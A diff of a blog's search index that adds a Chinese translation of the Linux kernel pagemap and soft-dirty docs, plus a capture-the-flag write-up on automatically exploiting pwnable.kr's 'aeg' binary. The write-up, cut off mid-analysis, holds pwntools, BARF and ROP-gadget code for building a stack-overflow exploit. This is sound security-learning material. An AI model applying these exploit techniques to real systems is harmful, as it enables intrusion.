@@ -1,6 +1,164 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>linux下的pgemap文件（翻译）</title>
+    <url>/2020/02/15/linux%E4%B8%8B%E7%9A%84pgemap%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>原文：<a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p>
+<a id="more"></a>
+<h1 id="用户空间角度下的pagemap"><a href="#用户空间角度下的pagemap" class="headerlink" title="用户空间角度下的pagemap"></a>用户空间角度下的pagemap</h1><p><code>pagemap</code>是内核中的一组新的接口，允许用户空间的程序通过读取<code>/proc</code>下的文件来检查页表及相关信息</p>
+<p><code>pagemap</code>文件包括四个组件：</p>
+<ul>
+<li><p><code>/proc/pid/pagemap</code>  该文件可以使一个用户空间的进程找到每一个虚拟页面映射到哪个物理帧。它为每一个物理页面包含一个64位的值，该值包含以下数据：</p>
+<ul>
+<li><code>0-54</code>位是页帧号<code>(page frame number aka PFN)</code> if present<ul>
+<li><code>0-4</code>位是交换类型<code>(swap type)</code> if swapped</li>
+<li><code>5-54</code>位是交换偏移<code>(swap offset)</code> if swapped</li>
+</ul>
+</li>
+<li><code>55</code>位表示<code>pte is soft-dirty</code></li>
+<li><code>56</code>位表示完全映射页<code>(page exclusively mapped)</code>（从linux4.2开始）</li>
+<li><code>57-60</code>位为0</li>
+<li><code>61</code>位表示页是文件页<code>(file-page)</code>还是匿名共享<code>(shared-anon)</code>（从linux3.5开始）</li>
+<li><code>62</code>位表示页被交换<code>(swapped)</code></li>
+<li><code>63</code>位表示页存在<code>(present)</code></li>
+</ul>
+<p>从linux4.0开始，只有拥有<code>CAP_SYS_ADMIN</code>特权的用户才能得到<code>PFN</code>这些数据。在4.0和4.1版本如果无此特权打开该文件，会失败并返回<code>-EPERM</code>。从linux4.2开始，如果用户没有此特权的话，读取<code>PFN</code>会得到0。原因就是<code>PFn</code>等数据的信息会帮助漏洞的利用</p>
+<p>如果页不存在但是在交换区，<code>PFN</code>就会包含编码后的交换文件号以及该页在交换区的偏移。未被映射的页返回空的<code>PFN</code>，这样就能精确地确定映射（或交换）了哪些页面，并在进程之间比较映射的页面</p>
+<p>高效的用户使用这个接口的话，会先用<code>/proc/pid/maps</code>来确定内存的哪些区域被映射了，然后使用<code>lseek</code>去跳过未被映射的区域</p>
+</li>
+<li><p><code>/proc/kpagecount</code>  该文件包含每个页被映射的次数，该次数是一个64位的数字，以<code>PFN</code>作为索引</p>
+</li>
+<li><p><code>/proc/kpageflags</code>  该文件包含每个页的一组64位的flags，以<code>PFN</code>作为索引</p>
+<p>flags为：</p>
+<pre><code>0. LOCKED
+ 1. ERROR
+ 2. REFERENCED
+ 3. UPTODATE
+ 4. DIRTY
+ 5. LRU
+ 6. ACTIVE
+ 7. SLAB
+ 8. WRITEBACK
+ 9. RECLAIM
+ 10. BUDDY
+ 11. MMAP
+ 12. ANON
+ 13. SWAPCACHE
+ 14. SWAPBACKED
+ 15. COMPOUND_HEAD
+ 16. COMPOUND_TAIL
+ 17. HUGE
+ 18. UNEVICTABLE
+ 19. HWPOISON
+ 20. NOPAGE
+ 21. KSM
+ 22. THP
+ 23. BALLOON
+ 24. ZERO_PAGE
+ 25. IDLE</code></pre></li>
+<li><p><code>/proc/kpagecgrope</code>  该文件包含每个页面管理的内存的cgroup的64位inode编号，以<code>PFN</code>为索引，只在<code>CONFIG_MEMCG</code>被设置后才可用</p>
+</li>
+</ul>
+<p>对页标志的简短介绍：</p>
+<ol start="0">
+<li><p><code>LOCKED</code>页被锁定为独占访问，例如，正在经受<code>read/write IO</code></p>
+</li>
+<li><p>当连续页<code>(compound page)</code>被使用的时候，<code>SLAB</code>页被<code>SLAB/SLOB/SLUB/SLQB</code>内核内存分配器管理</p>
+</li>
+<li><p><code>BUDDY</code>一个空闲的内存锁，由伙伴系统分配器管理。伙伴系统以各种顺序组织空闲内存。一个次序为N的块有$2^N$个物理上连续的页面，其中只有第一个页面设置了<code>BUDDY</code>标志</p>
+</li>
+<li><p><code>COMPOUND_HEAD</code></p>
+</li>
+<li><p><code>COMPOUND_TAIL</code>一个次序为N的连续页<code>(compound page)</code>包含$2^N$个物理连续页。一个次序为2的连续页的形式为“HTTT”，H指它是头页，T表示它（它们）是尾页。连续页的只要消耗着是<code>hugeTLB page</code>，<code>SLUB</code>，例如，内存分配器不同的设备驱动器。然而在这个接口中，只有<code>huge/giga pages</code>能被<code>end users</code>看到。</p>
+</li>
+<li><p><code>HUGE</code>这是<code>HugeTLB page</code>的组成页面</p>
+</li>
+<li><p><code>HWPOISON</code>硬件在此页上检测内存损坏：不要触碰这里的数据！</p>
+</li>
+<li><p><code>NOPAGE</code>在请求的地址没有页帧存在</p>
+</li>
+<li><p><code>KSM</code>在一个或多个进程之间动态共享的相同内存页</p>
+</li>
+<li><p><code>THP</code>相连的用来构造透明的大页面的页面</p>
+</li>
+<li><p><code>BALLOON</code>  ballon compaction page  涨大的压缩页面？？？</p>
+</li>
+<li><p><code>ZERO_PAGE</code>  zero page for pfn_zero or huge_zero page</p>
+</li>
+<li><p><code>IDLE</code>页面从被标记为<code>idle</code>开始就没有被访问。需要注意的是，如果通过<code>PTE</code>访问该页面，此标志可能会过时。要确保该标志是最新的，必须先读取<code>/sys/kernel/mm/page_idle/bitmap</code></p>
+<p>[ IO相关的页标志 ]</p>
+<ol>
+<li><p><code>ERROR</code>  IO错误已发生</p>
+</li>
+<li><p><code>UPTODATE</code>页面有最新数据</p>
+<blockquote>
+<p>   ie. for file backed page: (in-memory data revision &gt;= on-disk one)</p>
+</blockquote>
+</li>
+<li><p><code>DIRTY</code>页以及被写入，因此包含新数据</p>
+<blockquote>
+<p>   ie. for file backed page: (in-memory data revision &gt;  on-disk one)</p>
+</blockquote>
+</li>
+<li><p><code>WRITEBACK</code>页已经被同步到硬盘</p>
+</li>
+<li><p><code>LRU</code>页在<code>LRU lists</code>之一之内</p>
+</li>
+<li><p><code>ACTIVE</code>页在<code>active LRU list</code>之内</p>
+</li>
+</ol>
+</li>
+<li><p><code>UNEVICTABLE</code>页在<code>unevictable (non-)LRU list</code>之内</p>
+<blockquote>
+<p>它以某种方式固定，而不是LRU页面回收的候选</p>
+</blockquote>
+<ol start="2">
+<li><code>REFERENCED</code>自从上次<code>LRU list</code>入队/重新入对以来已经重新引用该页面</li>
+<li><code>RECLAIM</code>页面输出IO完成后将立即回收该页面</li>
+</ol>
+</li>
+<li><p><code>MMAP</code>一个内存映射页</p>
+</li>
+<li><p><code>ANON</code>一个非文件的一部分的内存映射页</p>
+</li>
+<li><p><code>SWAPCACHE</code>页被映射到交换空间，例如，有一个相关的交换入口</p>
+</li>
+<li><p><code>SWAPBACKED</code>页由swap/RAM支持</p>
+</li>
+</ol>
+<blockquote>
+<p>The page-types tool in the tools/vm directory can be used to query the above flags.</p>
+</blockquote>
+<p>用<code>pagemap</code>做一些有用的事情：</p>
+<p>使用<code>pagemap</code>查找进程的内存使用情况像是如下这样：</p>
+<ol>
+<li>读取<code>/proc/pid/maps</code>来确定内存空间中的哪一部分映射到了什么</li>
+<li>选择你需要的部分</li>
+<li>打开<code>/proc/pid/pagemap</code>并找到想要检查的页面</li>
+<li>从<code>pagemap</code>为每一页读取一个<code>uint64</code></li>
+<li>打开<code>/proc/kpagecount</code>和/或<code>/proc/kpageflags</code>。你所读取的每一个<code>PFN</code>,查找文件中的那个条目，并读取所需的数据</li>
+</ol>
+<p>例如，为了找到<code>&quot;unique set size&quot; (USS)</code>，即只被一个内存独享的内存的数量。你可以遍历进程中的每个映射，超导<code>PFN</code>，然后在<code>kpagecount</code>中查找他们，并计算仅被引用一次的页面的个数</p>
+<p>注意事项：</p>
+<p>如果没有从8字节的边界开始读取，或者读取的大小不是8的倍数，读任何文件都会返回<code>-EINVAL</code></p>
+<p>在linux3.11之前，<code>pagemap</code>的<code>55-60</code>位被用作表示<code>page-shift</code>（在某些架构里总是12）。从Linux 3.11开始，它们的含义在先清除<code>soft-dirty bits</code>后才改变。 从Linux 4.2开始，它们无条件地用于标志。</p>
+<h1 id="soft-dirty"><a href="#soft-dirty" class="headerlink" title="soft-dirty"></a>soft-dirty</h1><p>原文：<a href="https://www.kernel.org/doc/Documentation/vm/soft-dirty.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/soft-dirty.txt</a></p>
+<p><code>soft-dirty</code>是<code>PTE</code>的一位，用来帮助跟踪任务写入的页面。为了完成跟踪，页面应该：</p>
+<ol>
+<li><p>从任务的<code>PTEs</code>清除<code>soft-dirty</code>位</p>
+</li>
+<li><p>wait some time</p>
+</li>
+<li><p>从<code>PTEs</code>读取<code>soft-dirty</code>位</p>
+<p>读取<code>/proc/pid/pagemap</code>来完成此任务，第55位就是<code>soft-dirty</code>位。如果设置此位，就从步骤1开始写入相应的<code>PTE</code></p>
+</li>
+</ol>
+<p>在内部，为了进行跟踪，当<code>soft-dirty</code>位被清除时，可写位被从<code>PTE</code>中清除。因此，在此之后，当任务试图修改某个虚拟地址处的页面时，<code>#PF</code>会出现，内核会在相应的<code>PTE</code>上设置<code>soft-dirty</code>位。</p>
+<p>请注意，尽管在清除<code>soft-dirty</code>位后，所有任务的地址空间都标记为r / o，但是在此之后发生的<code>PF-s</code>将被快速处理。 之所以如此，是因为页面仍被映射到物理内存，因此内核所做的一切就是找出这一事实，并将可写位和<code>soft-dirty</code>位都放在<code>PTE</code>上。</p>
+<p>虽然在大多数情况下，通过<code>#PF-s</code>来跟踪内存更改已经足够了，但是仍然存在这样一种情况，即我们可能会丢失<code>soft-dirty</code>位——一个任务取消映射一个以前映射的内存区域，然后在完全相同的位置映射一个新的内存区域。当<code>unmap</code>被调用时，内核内部会清除包括软脏位在内的<code>PTE</code>值。为了将这种内存区域更新通知用户空间应用程序，内核总是将新的内存区域(和扩展的区域)标记为<code>soft-dirty</code>。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>smallbin在unlink的时候存在的漏洞</title>
     <url>/2020/02/07/smallbin%E5%9C%A8unlink%E7%9A%84%E6%97%B6%E5%80%99%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>遇到一题，需要此法，特分析源码，在此记录</p>
@@ -162,6 +320,146 @@
       <tags>
         <tag>pwn</tag>
         <tag>pwnable.kr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable.kr aeg自解</title>
+    <url>/2020/01/23/pwnable-kr-aeg%E8%87%AA%E8%A7%A3/</url>
+    <content><![CDATA[<p>最近想要学习自动化解题技术，于是选择了pwnable.kr的aeg一题进行学习</p>
+<a id="more"></a>
+
+<h1 id="何为AEG"><a href="#何为AEG" class="headerlink" title="何为AEG"></a>何为AEG</h1><p>AEG全称为Automatic Exploit Generation，意如其名，旨在考验答题者的自动化解题能力</p>
+<p>通常AEG的题目的解题过程是这样的：</p>
+<ul>
+<li>连接到远程端，远程端会发送过来一串base64加密的字符串</li>
+<li>接收字符串，进行解密，将解密后的数据保存到本地，得到一个压缩文件</li>
+<li>对文件进行解压，得到可执行二进制文件</li>
+<li>此时有10秒钟的时间来生成shellcode，时间一过，连接自动断开</li>
+</ul>
+<p>每次连接所得到的二进制文件都大体相同，但其中存在着许多细节上的不同</p>
+<p>因此这里自动化解题的对象并不是一类题，只能说是一道题，因此只需要写出一个针对当前题目的自动生成payload的脚本即可，难度要相对小一些</p>
+<h1 id="pwnable-kr-aeg"><a href="#pwnable-kr-aeg" class="headerlink" title="pwnable.kr aeg"></a>pwnable.kr aeg</h1><p>这道题位于Grotesque区，属于中等难度的pwn题目</p>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>先连接一次，得到一个可执行文件，checksec检测一次</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">"rm -rf ./recv.bin, ./recv.decoded"</span>)</span><br><span class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9005</span>)</span><br><span class="line">io.recvuntil(<span class="string">'wait...\n'</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"recv.bin"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'zcat ./recv.bin &gt; ./recv.decoded'</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] '/ctf/work/recv.decoded'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>发现只开启了NX，表明可能存在栈溢出漏洞</p>
+<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>IDA打开之后，进去找到main函数，然后F5万能大法</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+11h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+12h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_4565995(<span class="number">1L</span>L, <span class="number">2L</span>L, <span class="number">3L</span>L, <span class="number">4L</span>L, <span class="number">5L</span>L, <span class="number">6L</span>L);</span><br><span class="line">    srand(v4);</span><br><span class="line">    dword_476772C = <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_476772C &lt;= <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * dword_476772C &gt; v15 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[<span class="number">1</span>][v15];</span><br><span class="line">        v8 = a2[<span class="number">1</span>][v15 + <span class="number">1</span>];</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v5 = v14++;</span><br><span class="line">        __isoc99_sscanf(&amp;v7, <span class="string">"%02x"</span>, &amp;byte_4767740[v5]);</span><br><span class="line">        v15 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_476772C; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v10 == <span class="number">72</span> &amp;&amp; (_BYTE)v13 == <span class="number">64</span> &amp;&amp; <span class="number">78</span> * (_BYTE)v13 + <span class="number">51</span> * (_BYTE)v10 - (_BYTE)v12 == <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v13++;</span><br><span class="line">          v12 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload encoded. let's go!"</span>);</span><br><span class="line">      sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"end of program"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload length exceeds 1000byte"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"usage : ./aeg [hex encoded payload]"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>流程是这样的：</p>
+<ul>
+<li>检查是否有一个命令行的参数，如果否，则打印usage然后退出</li>
+<li>检查参数的长度除以2放入<code>dword_476772C</code>，检测其是否小于等于1000，如果否，则退出</li>
+<li>在while循环中，将我们的输入以如下规则转换：字符串的<code>&quot;ab&quot;</code>转换成数字<code>0xab</code>，即两个字节转换成一个字节，放入<code>byte_4767740</code>中</li>
+<li>在for循环中，能看到好几句if，但大多数的if是无用操作，用来混淆视听，唯一有用的地方是<code>i&amp;1</code>判断处的<code>if else</code>，这里对输入进行一系列异或加密</li>
+<li>加密完之后，执行<code>sub_45658F0</code>函数</li>
+</ul>
+<h2 id="sub-45658F0函数"><a href="#sub-45658F0函数" class="headerlink" title="sub_45658F0函数"></a><code>sub_45658F0</code>函数</h2><p>第一处函数调用，其参数为加密后的输入前三个字节</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_45658F0</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xE4</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x4C</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1E</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x24</span> * a1 + <span class="number">0x29</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x62</span> )</span><br><span class="line">        result = sub_4565870(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767743,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767744,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767745);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对第一个字节，检测其是否等于<code>0xE4</code></p>
+<p>对第二个字节，检测式子<code>0x4C - a2 == 0x1E</code>是否成立</p>
+<p>对第三个字节，检测式子<code>0x24 * a1 + 0x29 * a2 - a3 == 0x62</code>是否成立</p>
+<p>全部成立之后，进入<code>sub_4565870</code>函数，参数是加密后的输入的第四、五、六个字节</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_4565870</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDB</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x5A</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x26</span> * a1 + <span class="number">0x25</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x2A</span> )</span><br><span class="line">        result = sub_45657F3(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767746,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767747,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767748);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处可以看到，这里是套娃式检测，但是检测的条件都变了</p>
+<p>就这样一环套一环，一直到最后</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_45651C1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;unk_4767770, dword_476772C - <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>unk_4767770</code>相对加密后输入<code>byte_4767740</code>偏移0x30，<code>dword_476772C</code>是最开始保存的输入长度除以2</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里我主要使用了<code>z3 barf</code>这两个库</p>
+<h3 id="分析得到main函数的basic-blocks"><a href="#分析得到main函数的basic-blocks" class="headerlink" title="分析得到main函数的basic blocks"></a>分析得到main函数的basic blocks</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_name = <span class="string">'./recv.decoded'</span></span><br><span class="line">barf = barf.BARF(binary_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_main_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rdi'</span>:</span><br><span class="line">            main_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> main_address</span><br><span class="line">main_address = get_main_address()</span><br><span class="line">cfg = barf.recover_cfg(start=main_address)</span><br><span class="line">basic_blocks = cfg.basic_blocks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_block</span><span class="params">(addr, basic_blocks)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    从basic blocks中查找以addr为起始地址的block</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"[-] address can not be None!"</span>)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> basic_blocks:</span><br><span class="line">        <span class="keyword">if</span> block.address == addr:</span><br><span class="line">            <span class="keyword">return</span> block</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"[-] can not find it!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们要从main函数开始分析，所以这一步是必要的</p>
+<h3 id="分析得到init-csu的gadget的地址"><a href="#分析得到init-csu的gadget的地址" class="headerlink" title="分析得到init_csu的gadget的地址"></a>分析得到init_csu的gadget的地址</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_init_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rcx'</span>:</span><br><span class="line">            init_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> init_address</span><br><span class="line">init_address = get_init_address()</span><br><span class="line">init_offset1 = <span class="number">0x5a</span></span><br><span class="line">init_offset2 = <span class="number">0x40</span></span><br><span class="line">init_addr1 = init_address + init_offset1</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">init_addr2 = init_address + init_offset2</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">mov     rdx, r13</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r15d</span></span><br><span class="line"><span class="string">call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbx, rbp</span></span><br><span class="line"><span class="string">jnz     short loc_8731CF0</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, rdx, rsi, rdi)</span>:</span></span><br><span class="line">    gadget = <span class="string">''</span></span><br><span class="line">    gadget += p64(rbx) + p64(rbp) + p64(r12)</span><br><span class="line">    gadget += p64(rdx) + p64(rsi) + p64(rdi)</span><br><span class="line">    <span class="keyword">return</span> gadget</span><br></pre></td></tr></table></figure>
+
+<p>因为源程序中并没有什么可用的gadget，因此使用这里，且这里也相对好找一些</p>
+<h3 id="分析得到加密后数据所在的地址"><a href="#分析得到加密后数据所在的地址" class="headerlink" title="分析得到加密后数据所在的地址"></a>分析得到加密后数据所在的地址</h3><p>用IDA的CFG视图对main函数进行查看，可以发现，得到数据地址的块需要走的路径为：</p>
+<figure class="image-box">
+                <img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152129633.png" alt="image-20200123152129633" title class>
+                <p>image-20200123152129633</p>
+            </figure>
+
+<p>即<code>start -&gt; taken_branch -&gt; taken_branch -&gt; direct_branch -&gt; taken_branch</code></p>
+<p>这里我们可以发现，最后一次取<code>taken_branch</code>之后，相当于进入了while循环，所以我们还得保存住那里的<code>not_taken_branch</code>以便直接走出循环</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block = find_block(basic_blocks[<span class="number">0</span>].taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch <span class="comment"># 为了走出循环</span></span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        index -= <span class="number">5</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">instr = block.instrs[index]</span><br><span class="line">inp_address = int(instr.operands[<span class="number">1</span>].to_string()[<span class="number">5</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">call sscanf的之前第五个指令的第二个操作数就包含了加密后数据的地址</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
+
